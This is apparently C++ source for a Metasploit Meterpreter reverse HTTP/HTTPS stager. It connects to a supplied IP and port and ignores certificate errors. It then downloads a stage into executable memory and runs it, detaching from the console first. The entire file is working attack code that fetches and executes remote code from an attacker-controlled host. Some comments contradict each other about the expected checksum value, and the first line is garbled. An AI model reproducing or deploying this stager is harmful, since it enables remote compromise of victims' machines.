//»”„ «··Â «·—Õ„‰ «·—ÕÌ„
#include "main.h"

void StagerReverseHTTP(wchar_t *IP, wchar_t *iPort, wchar_t *transport)
{
	int checksum = 0;			//Calculated Checksum placeholder. 
	char URI[5] = {0};			//4 chars ... it can be any length actually.
	char FullURL[6] = {0};	// FullURL
	wchar_t wFullURL[16] = {0};
	char* booof = nullptr;
	DWORD flags = 0;
	char ansiPort[16] = {0};

	srand ( (UINT)time(NULL) );	//Seed rand() 

	while(true)				//Keep getting random values till we succeed, don't worry, computers are pretty fast and we're not asking for much.
	{
		gen_random(URI, 4);				//Generate a 4 char long random string ... it could be any length actually, but 4 sounded just fine.
		checksum = TextChecksum8(URI);	//Get the 8-bit checksum of the random value
		if(checksum == URI_CHECKSUM_INITW)		//If the checksum == 92, it will be handled by the multi/handler correctly as a "INITM" and will send over the stage.
		{
			break; // We found a random string that checksums to 98
		}
	}

	strcpy_s(FullURL,"/");
	strcat_s(FullURL,URI);
	strcat_s(FullURL,"\0");			// make sure it ends here...
	mbstowcs_s(NULL,wFullURL,FullURL,strlen(FullURL));
	dprintf(L"[*] Calculated URL: %s\n",wFullURL);

	//HTTP? HTTPS?
	if(wcscmp(transport,L"METERPRETER_TRANSPORT_HTTP") == 0)
	{
		flags = (INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_AUTO_REDIRECT | INTERNET_FLAG_NO_UI);
		dprintf(L"[*] Make sure you have \"windows/meterpreter/reverse_http\" handler running.\n");
	}
	else
	{

		flags = (INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_AUTO_REDIRECT | INTERNET_FLAG_NO_UI | INTERNET_FLAG_SECURE | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_UNKNOWN_CA );
		dprintf(L"[*] Make sure you have \"windows/meterpreter/reverse_https\" handler running.\n");
	}


	//InternetOpen, InternetConnect, HttpOpenRequest, HttpSendRequest, InternetReadFile
	HINTERNET hInternetOpen;
	HINTERNET hInternetConnect;
	HINTERNET hInternetRequest;

	hInternetOpen = InternetOpen(L"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:11.0) Gecko Firefox/11.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, NULL);
	if( hInternetOpen == NULL )
	{
		dprintf(L"[-] InternetOpen failed with error code %d\n", GetLastError());
		exit(1);
	}

	UnicodeToAnsi(ansiPort,iPort);
	hInternetConnect = InternetConnect(hInternetOpen, IP, atoi(ansiPort), NULL, NULL, INTERNET_SERVICE_HTTP, NULL, NULL);   
	if( hInternetConnect == NULL )
	{
		dprintf(L"[-] hInternetConnect failed with error code %d\n", GetLastError());
		exit(1);
	}

	hInternetRequest = HttpOpenRequest(hInternetConnect, L"GET", wFullURL, NULL, NULL, NULL, flags,	NULL);
	if( hInternetRequest == NULL )
	{
		dprintf(L"[-] hInternetRequest failed with error code %d\n", GetLastError());
		exit(1);
	}

	DWORD dwSecFlags = 0;
	if(wcscmp(transport,L"METERPRETER_TRANSPORT_HTTPS") == 0) {
			dprintf(L"[*] HTTPS: Setting special security flags ...\n");
		dwSecFlags = SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_WRONG_USAGE | SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_REVOCATION ;
		InternetSetOption (hInternetRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwSecFlags, sizeof (dwSecFlags) );
	}
	dprintf(L"[*] Connecting...\n");

	if(!HttpSendRequest(hInternetRequest, NULL, NULL, NULL,	NULL)) 
	{
		dprintf(L"[-] HttpSendRequest failed with error code %d\n", GetLastError());
		exit(1);
	};
	dprintf(L"[*] Connected! Reading stage into buffer...\n");

	booof = (char*)VirtualAlloc(0, (4 * 1024 * 1024), MEM_COMMIT, PAGE_EXECUTE_READWRITE) ; //allocate

	BOOL bKeepReading = true;
	DWORD dwBytesRead = -1;
	DWORD dwBytesWritten = 0;
	while(bKeepReading && dwBytesRead!=0)
	{
		bKeepReading = InternetReadFile(hInternetRequest, (booof + dwBytesWritten), 4096, &dwBytesRead);
		dwBytesWritten += dwBytesRead;
	}
	dprintf(L"[*] Stage loaded in buffer: %d bytes read.\n", dwBytesWritten);
	InternetCloseHandle(hInternetRequest);
	InternetCloseHandle(hInternetConnect);
	InternetCloseHandle(hInternetOpen);
	dprintf(L"[*] Detaching from console & calling the function, bye bye [ultimet], hello metasploit!\n");
	FreeConsole();
	(*(void (*)())booof)();//Bye bye ...
}

void gen_random(char *s, const int len) { //ripped & modified "added srand()" from http://stackoverflow.com/questions/440133/how-do-i-create-a-random-alpha-numeric-string-in-c
	static const char alphanum[] =
		"0123456789"
		"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
		"abcdefghijklmnopqrstuvwxyz";

	for (int i = 0; i < len; ++i) {
		s[i] = alphanum[rand() % (sizeof(alphanum) - 1)];
	}

	s[len] = 0;
}

int TextChecksum8(char* text)
{
	UINT temp = 0;
	for(UINT i = 0; i < strlen(text); i++)
	{
		temp += (int)text[i];
	}
	return temp % 0x100;
}